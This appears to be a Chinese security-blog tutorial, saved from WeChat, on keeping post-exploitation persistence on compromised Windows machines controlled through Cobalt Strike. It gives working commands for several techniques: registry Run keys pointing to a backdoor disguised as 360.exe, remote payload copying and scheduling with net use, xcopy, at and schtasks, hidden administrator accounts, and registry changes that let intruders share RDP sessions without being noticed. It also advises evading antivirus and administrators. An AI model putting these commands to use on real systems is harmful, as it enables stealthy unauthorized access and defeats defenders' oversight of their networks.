> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/E0gJPSOyDk3-FigjdjwKdQ)

****出品｜MS08067 实验室****

> 本文作者：**BlackCat**（Ms08067 内网安全小组成员）

BlackCat 微信（欢迎骚扰交流）：

![](https://mmbiz.qpic.cn/mmbiz_jpg/XWPpvP3nWaicKmo497U2PIqIPcXWRaIt5axwAskE0hw31ju4wfmTGXvEPfPrDWkMDBT7hDUY52pwY000rRwz3rQ/640?wx_fmt=jpeg)  

**前言：**  

昨天做 CS 批量上线的时候发现，内网渗透的本质都是信息收集，也就是收集各种账号密码，一旦有了密码，这个系统也就不攻而破了。然后就在网上以及查阅资料中，整理了以下的搜集姿势。

**权限维持：**

比如通过钓鱼邮件，批量获取了一批上线机器，但是我们不能第上来就进行其他主机的渗透，第一步应 该进行维稳加固。

**维稳方法一：加入出册表自启动**

之所以放入注册表中，是由于我们后期的操作可能需要一个正常用户权限的 shell, 因为有些操作必须在对应的用户权限下才能正常进行，比如 wmi,schtasks,net user, 截屏，键盘记录等等。。

在网上翻阅了一大堆的关于这个方法的资料

参考链接：

网上大佬的脚本方法我没能实验成功，就算成功了，上传会不会被杀也不一定，所以我选择了最保守的 方法利用 beacon 执行 cmd 的命令来修改注册表：

这里用到了 reg 命令：eg 命令是 Windows 提供的，它可以添加、更改和显示注册表项中的注册表子项信息和值。

首先我们要知道，注册表里开机自启动的目录是什么：

Win+R 执行 regedit 后依次打开以下目录

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

![](https://mmbiz.qpic.cn/mmbiz_jpg/XWPpvP3nWaicKmo497U2PIqIPcXWRaIt5un6ZV4lHO67LAgp4GboExicX9TtKIxnfJoIMlib23scG1WicD7bzdutdQ/640?wx_fmt=jpeg)

  

  

这样就能看到开机自启动的内容都有什么:

这个在 cmd 中的命令为

REG query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run# 显示这个目录下的所有的值

在 beacon 中执行就是前面加个 shell

![](https://mmbiz.qpic.cn/mmbiz_jpg/XWPpvP3nWaicKmo497U2PIqIPcXWRaIt5IZjzlKcHLSkWicS6QrB3YGByicgPYOXW4P2l4VVIibIeNxLGicBcxHgBow/640?wx_fmt=jpeg)

  

  

可以看到成功执行：然后下一步就是添加我们的后门程序到这个目录下，个人经验，感觉这里尽量稍稍 伪装一下自己的后门程序名，有的管理员安全意识高的可能会查看，这里我把它改为 360.exe

然后通过文件浏览器，把这个后门上传上去，但是一定要做好免杀，这里我上传到了 "C:\Windows\Temp" 目录下：

语法为：

reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\run" /v【启 bai 动名】/d "【启动路径】"/f 替换

上面这个会对所有用户生效，如果只想对当前用户生效，把 HKEY_LOCAL_MACHINE 改为 HKEY_CURRENT_USER 就可以了。

REG add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v 360 /d "C:\Windows\Temp\360.exe" /f

然后在 beacon 中执行：

![](https://mmbiz.qpic.cn/mmbiz_jpg/XWPpvP3nWaicKmo497U2PIqIPcXWRaIt50rcko7RYJ7DjruO9RmiagK1OJhERsJVsibuodJaZMSMIia3PE8SJZaQ6Q/640?wx_fmt=jpeg)

  

  

然后去被控机上面看是否生效:

![](https://mmbiz.qpic.cn/mmbiz_jpg/XWPpvP3nWaicKmo497U2PIqIPcXWRaIt5Ioiakazqm4iaHreC106gXgmYliaSc4FQBFhKYWiavyOLQhqGTvVZVoqt2g/640?wx_fmt=jpeg)

  

  

成功了 。。还有⼀条删除命令：

REG delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v 360 /f #删除 360 这个进程

![](https://mmbiz.qpic.cn/mmbiz_jpg/XWPpvP3nWaicKmo497U2PIqIPcXWRaIt5GIRhFeYCA3L9voQI0JGIwUJicubI6hW5pEGAZc4yh7eD2rFtvU5EIHA/640?wx_fmt=jpeg)

  

  

最后我先在 cs 上下了这台机器，然后重启了下这台机器，重启后发现 cs 直接上线，所以这步我们就此告—段落。

![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWaicKmo497U2PIqIPcXWRaIt5TvAzl02NicB6KBBQicicjPNY5K9LnyxGLtVATOEgCbWZodf8wL00J6Q8A/640?wx_fmt=png)

  

  

REG query"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"# 显示这个目录下的所有的值 REG add"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"/v360/d"C:\Windows\Temp\360.exe" /f #把上传的后门程序设置成开机自启动 REG delete"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"/v 360/f #删除自启动

**维稳方法二：加入高权限组执行计划任务**

一般情况下我们获取的 CS 后门权限都是 administrator 的，

但是我们后期要弹 system 的 shell 时候，或者和域内 DC 机通讯的话，还是需要 system 权限的。最简单的提权

![](https://mmbiz.qpic.cn/mmbiz_jpg/XWPpvP3nWaicKmo497U2PIqIPcXWRaIt54zY1hCFK4kKwoL4YT8ZIVf7f6WjnoX7jePZCFgLCxCAx5Fa01WxMZw/640?wx_fmt=jpeg)

  

  

执行完后会新上线一台机器权限为 system，提权成功。

![](https://mmbiz.qpic.cn/mmbiz_jpg/XWPpvP3nWaicKmo497U2PIqIPcXWRaIt5ZPEaGicfflzqtQxMicHp7c5Cr5uO6WFFMpVNDZicO1pHtzrX0KQUHybZQ/640?wx_fmt=jpeg)

  

  

但是慢慢发现，有的时候，system 权限并虽然高，但是感觉还是不适合我们操作，有些命令还是 administrator 权限执行可以，比如 wmi,schtasks,netuse r, 截屏，键盘记录等

这里就在继续说一下

**维稳方法三：Windows 的计划任务（schtasks）**

**简介：**

计划任务，顾名思义，指定时间做指定的事情，对 windows 来说可能是执行脚本，也可能是 exe。计划任务的利用不仅仅在横向渗透中，也可以是在权限维持。

**利用前提:**

1. 必须通过其他手段拿到本地或者域管理账号密码

2. 若在横向渗透过程中，要保证当前机器能 netuse 远程到目标机器上

3. 目标机器开启了 taskscheduler 服务

**测试：**

对于 XP 或者 2003 以下的机器，基本都是用 at 来管理本地或者远程机器上的计划任务。这里没有搭建 03 的机器，就简单的列一下命令，解释一下。

ne tuse \\192.168.1.101\admin$ /user:"administrator" admin #netuse 连接

net time \\192.168.1.101 #查看远程主机时间

xcopyc:\payload.exe \\192.168.1.101\admin$\temp 

# 拷贝 payload 至 0 远程主机对应目录下

at\\192.168.1.10119:30 /every:5,10,15,20,25,30c:\windows\temp\payload.exe

#设定计划任务，每月 5,10,15,20,25,30 日的 19:30 执行命令运行 payload

设置完计划任务后可以通过以下命令查看：

at \\192.168.1.101

删除任务的话只需要加上参数 / delete 即可。这样会在指定日期的晚上七点半返回一个会话。

在 win7 后的版本就有了个新的功能，schtasks 计划任务：

![](https://mmbiz.qpic.cn/mmbiz_jpg/XWPpvP3nWaicKmo497U2PIqIPcXWRaIt5WA6p54WM6t7FOsiah2158xYnpYRaqQNPR5lewhNyEa9ApYLXw97quWQ/640?wx_fmt=jpeg)

  

  

比如我要在十点后启用这个这个后门。

schtasks/create /tn "360"/trC:\Windows\Temp\360.exe /sc DAILY /st 10:00

/tn 任务名（自定义）/tr 目录，也可以是执行的命令  
schtasks/query /tn 360/v schtasks /query|findstr "360"  
#查询创建的任务         
schtasks/run /tn 360  
#立即运行创建的任务    
schtasks/delete /tn 360  
#删除任务

![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWaicKmo497U2PIqIPcXWRaIt57KSDE4XiaUQlqBXsAW4kpicKUHWGVFO5bI9RHT3O8QibsJFF9OicO0Ls9w/640?wx_fmt=png)

  

![](https://mmbiz.qpic.cn/mmbiz_jpg/XWPpvP3nWaicKmo497U2PIqIPcXWRaIt5ib7JqHY7SpyiaafxAiaOR7Th4UcibLxcTbRhPzp9ByVSwVLJdhia6TBoYhg/640?wx_fmt=jpeg)

  

  

**参考:**

说了这么多，感觉比较麻烦，那我们直接运行不就好了么，其实不然，有些安全软件，会识别你的行为，阻止你去执行某些操作，但是计算机执行的操作则不会被拦截，所以也常用于内网中的 bypass。

**维稳方法四：创建隐藏用户**

**简介：**

隐藏用户也叫影子用户，创建一个无法用用户本机用户罗列工具显示的用户，并且赋予管理员权限。所有操作需要有管理员权限。同时测试在 windowsserver 2012 服务器域环境下影子账户无法直接进行添加。

详细操作步骤参考网上资料；

**维稳方法五：多地登陆管理员账号不被发现**

这个是我一个朋友告诉我的方法，他在护网时候权限丢失就是远程登陆 administrato r 账号的时候，被管理员发现，然后关机了，导致权限丢失，那么如何解决这个问题。这个执行起来也很简单

还是修改注册表：

首先线以此打开注册表中的文件

\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\TerminalServer\fSingleSessionPerUser

双击打开这个文件，看里面的数值数据为 0 还是 1

为 1 是不允许多地远程，

为 0, 是允许 03 以上的系统基本上默认都是为 1 不允许所以这里就需要我们更改这个

![](https://mmbiz.qpic.cn/mmbiz_jpg/XWPpvP3nWaicKmo497U2PIqIPcXWRaIt5w0QXJSeG4oiaJ603mKib6OINibiaVibnZNNWTxSmsXxhS6pSlQj8TosN4cw/640?wx_fmt=jpeg)

  

  

之后再多个终端远程这台主机就不会有提示了。

**总结：**

我这里只是简单介绍了一些 CS 的简单使用，没有涉及到各种杀软的绕过，CS 的提权插件以及内网主机搜集插件等，还有就是 CS 后门免杀技术。我也在正在学习后门免杀技术，后续如果可能在做分享。

维稳方法还有很多，这里就先介绍这些吧，CS 上线只是内网渗透的一个开始，本人也是初学者，文中如果哪里存在纰漏，敬请大佬们批评指正。

内网小组持续招人，扫描二维码加入我们！

![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWa9Y7Ac6gb6JZVymJwS3gu8cRey7icGjpsvppvqqhcYo6RXAqJcUwZy3EfeNOkMRS37m0r44MWYIYmg/640?wx_fmt=png)

**扫描下方二维码加入星球学习**

**加入后会邀请你进入内部微信群，内部微信群永久有效！**

![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWa9Y7Ac6gb6JZVymJwS3gu8cniaUZzJeYAibE3v2VnNlhyC6fSTgtW94Pz51p0TSUl3AtZw0L1bDaAKw/640?wx_fmt=png) ![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWa9Y7Ac6gb6JZVymJwS3gu8cT2rJYbRzsO9Q3J9rSltBVzts0O7USfFR8iaFOBwKdibX3hZiadoLRJIibA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWaicBVC2S4ujJibsVHZ8Us607qBMpNj25fCmz9hP5T1yA6cjibXXCOibibSwQmeIebKa74v6MXUgNNuia7Uw/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWa9Y7Ac6gb6JZVymJwS3gu8cRey7icGjpsvppvqqhcYo6RXAqJcUwZy3EfeNOkMRS37m0r44MWYIYmg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_jpg/XWPpvP3nWaicjovru6mibAFRpVqK7ApHAwiaEGVqXtvB1YQahibp6eTIiaiap2SZPer1QXsKbNUNbnRbiaR4djJibmXAfQ/640?wx_fmt=jpeg) ![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWaicJ39cBtzvcja8GibNMw6y6Amq7es7u8A8UcVds7Mpib8Tzu753K7IZ1WdZ66fDianO2evbG0lEAlJkg/640?wx_fmt=png)  

**目前 35000 + 人已关注加入我们  
**![](https://mmbiz.qpic.cn/mmbiz_gif/XWPpvP3nWa9FwrfJTzPRIyROZ2xwWyk6xuUY59uvYPCLokCc6iarKrkOWlEibeRI9DpFmlyNqA2OEuQhyaeYXzrw/640?wx_fmt=gif)